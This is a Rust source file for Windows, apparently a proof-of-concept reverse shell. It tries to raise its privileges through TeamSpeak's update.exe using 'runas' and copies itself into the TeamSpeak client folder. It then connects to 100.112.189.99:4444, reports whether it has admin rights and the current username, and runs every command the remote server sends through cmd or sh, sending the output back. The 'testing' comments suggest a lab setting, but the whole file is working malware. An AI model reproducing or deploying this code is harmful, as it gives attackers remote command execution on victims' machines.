// Import necessary crates and modules
extern crate winapi;
use std::env;
use std::ffi::OsStr;
use std::fs;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;
use std::process::Command;
use std::ptr;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::shellapi::{ShellExecuteExW, SHELLEXECUTEINFOW};
use winapi::um::winnt::{TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY};
use winapi::um::winuser::SW_SHOW;
extern crate whoami;

// Function to check if the current process has administrative rights
fn has_admin_rights() -> bool {
    unsafe {
        // Attempt to open the current process token
        let mut handle: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut handle) == 0 {
            return false;
        }

        // Check the token for elevation
        let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
        let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
        let result = GetTokenInformation(
            handle,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            size,
            &mut size,
        );

        // Return whether the token is elevated
        if result == 0 {
            return false;
        }
        elevation.TokenIsElevated != 0
    }
}

// Function to make a network connection and send/receive data
fn make_network_connection(address: &str) {
    match TcpStream::connect(address) {
        Ok(mut stream) => {
            // Send admin status to the ncat server
            let admin_status = if has_admin_rights() {
                "Admin rights: YES\n"
            } else {
                "Admin rights: NO\n"
            };
            stream
                .write_all(admin_status.as_bytes())
                .expect("Failed to send admin status");

            // Send username information
            let username = whoami::username();
            let user_info = format!("Executed by user: {}\n", username);
            stream
                .write_all(user_info.as_bytes())
                .expect("Failed to send user info");

            // Read and execute commands received from the server
            let mut buffer = [0; 4096];
            loop {
                let size = match stream.read(&mut buffer) {
                    Ok(size) => size,
                    Err(e) => {
                        eprintln!("Failed to read from stream: {}", e);
                        break;
                    }
                };

                // If no data received, break loop
                if size == 0 {
                    println!("Connection closed by the remote host.");
                    break;
                }

                // Execute received command
                let command = String::from_utf8_lossy(&buffer[..size]);
                let output = if cfg!(target_os = "windows") {
                    Command::new("cmd").args(["/C", command.trim()]).output()
                } else {
                    Command::new("sh").arg("-c").arg(command.trim()).output()
                };

                // Send command output back to the server
                match output {
                    Ok(output) => {
                        let response = if output.status.success() {
                            String::from_utf8_lossy(&output.stdout)
                        } else {
                            String::from_utf8_lossy(&output.stderr)
                        };

                        stream
                            .write_all(response.as_bytes())
                            .expect("Failed to write to stream");
                    }
                    Err(e) => {
                        eprintln!("Failed to execute command: {}", e);
                        break;
                    }
                }
            }
        }
        Err(e) => println!("Failed to connect: {}", e),
    }
}

// Function to attempt running the current process with administrative privileges
fn run_as_admin() -> winapi::shared::minwindef::BOOL {
    // Define the 'runas' operation to elevate privileges
    let operation = OsStr::new("runas")
        .encode_wide()
        .chain(Some(0))
        .collect::<Vec<_>>();
    // Specify the file to be run as admin (in this case, update.exe from TeamSpeak)
    let file = OsStr::new("C:\\Users\\TestUser\\AppData\\Local\\TeamSpeak 3 Client\\update.exe")
        .encode_wide()
        .chain(Some(0))
        .collect::<Vec<_>>();

    // Set up the structure for ShellExecuteExW call
    let mut sei = SHELLEXECUTEINFOW {
        cbSize: std::mem::size_of::<SHELLEXECUTEINFOW>() as u32,
        fMask: 0x00000040, // SEE_MASK_NOCLOSEPROCESS
        hwnd: ptr::null_mut(),
        lpVerb: operation.as_ptr(),
        lpFile: file.as_ptr(),
        lpParameters: ptr::null(),
        lpDirectory: ptr::null(),
        nShow: SW_SHOW,
        hInstApp: ptr::null_mut(),
        // Remaining fields set to default or null values
        lpIDList: ptr::null_mut(),
        lpClass: ptr::null_mut(),
        hkeyClass: ptr::null_mut(),
        dwHotKey: 0,
        hMonitor: ptr::null_mut(),
        hProcess: ptr::null_mut(),
    };

    // Call ShellExecuteExW to execute the process with elevated privileges
    unsafe { ShellExecuteExW(&mut sei) }
}

// Main function
fn main() {
    // Attempt to run the program with elevated privileges and establish network connection
    if run_as_admin() == 0 {
        println!("Failed to start process with elevated privileges");
    } else {
        println!("Process started with elevated privileges");
    }
    if has_admin_rights() {
        println!("Already an admin. Making network connection...");
        make_network_connection("100.112.189.99:4444"); // Target server address and port
    } else {
        // Copy current executable to a new location and establish network connection
        let exe_path = env::current_exe().expect("Failed to get current executable path");
        let mut new_path = PathBuf::from("C:\\Users\\TestUser\\AppData\\Local\\TeamSpeak 3 Client");
        new_path.push("copied_program.exe");

        fs::copy(&exe_path, &new_path).expect("Failed to copy executable");

        println!("Executable copied to {:?}", new_path);
        make_network_connection("100.112.189.99:4444");
    }
    // Wait for user input before closing the program .. just for testing purposes
    println!("Press Enter to exit...");
    let mut exit_input = String::new();
    io::stdin()
        .read_line(&mut exit_input)
        .expect("Failed to read line");
}
